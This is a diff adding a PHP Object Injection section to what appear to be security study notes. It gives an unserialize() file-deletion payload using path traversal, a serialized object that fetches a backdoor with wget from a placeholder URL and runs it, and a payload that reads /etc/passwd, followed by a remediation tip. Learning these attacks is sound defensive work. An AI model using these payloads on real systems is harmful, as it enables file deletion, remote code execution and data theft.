@@ -69,17 +69,68 @@ XXE Out of Bounds attack (XXE OOB)
 ### PHP Un-serialize
 ---
 
-**Summary**  
-
-__Serialisation__ is converting an object into a stream of bytes, in order to store/transmit the object and then de-serialise it when needed.
-
-**PHP Object Injection**  
+**PHP Object Injection Summary**  
 
 Allows an attacker to perform _code / sql injection_, _path traversal_ and _denial of service_ attacks due to user-input not being properly sanitised before being passed to the `unseralize()` PHP function.  
 
 Since PHP allows object serialisation, attackers can pass in a malicious string to a vulnerable `unserialize()` call, resulting in arbitrary PHP object injection.  
 
-See more: <a href="https://www.owasp.org/index.php/PHP_Object_Injection">PHP Object Injection</a>  
+_See more_: <a href="https://www.owasp.org/index.php/PHP_Object_Injection">PHP Object Injection</a>  
+_PHP Magic Methods_: http://php.net/manual/en/language.oop5.magic.php  
+
+**Exploits**
+
+Example: Deleting an arbitrary file via. Path Traversal
+```PHP
+class Example1 {
+   public $cache_file;
+
+   function __construct() {
+      // some PHP code...
+   }
+
+   function __destruct() {
+      $file = "/var/www/cache/tmp/{$this->cache_file}";
+      if (file_exists($file)) @unlink($file);
+   }
+}
+// some PHP code...
+$user_data = unserialize($_GET['data']);
+// some PHP code...
+
+// PAYLOAD //
+http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}
+```
+
+Example: Reverse Shell
+```PHP
+class PHPObjectInjection
+{
+   // CHANGE URL/FILENAME TO MATCH YOUR SETUP
+   public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
+}
+// GENERATE ENCODED PAYLOAD
+echo urlencode(serialize(new PHPObjectInjection));
+```
+
+Example: Local File Disclosure
+```
+class PHPObjectInjection
+{
+   // CHANGE URL/FILENAME TO MATCH YOUR SETUP
+   public $inject = "system('cat /etc/passwd');";
+}
+
+echo urlencode(serialize(new PHPObjectInjection));
+//O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A26%3A%22system%28%27cat+%2Fetc%2Fpasswd%27%29%3B%22%3B%7D
+//'O:18:"PHPObjectInjection":1:{s:6:"inject";s:26:"system(\'cat+/etc/passwd\');";}'
+```
+
+**Remediation**
+
+Do not use unserialize() function with user-supplied input, use JSON functions instead i.e. `json_encode()` / `json_decode()`.
+ 
+
 
 ### Advanced XSS - Same Origin Policy
 ---
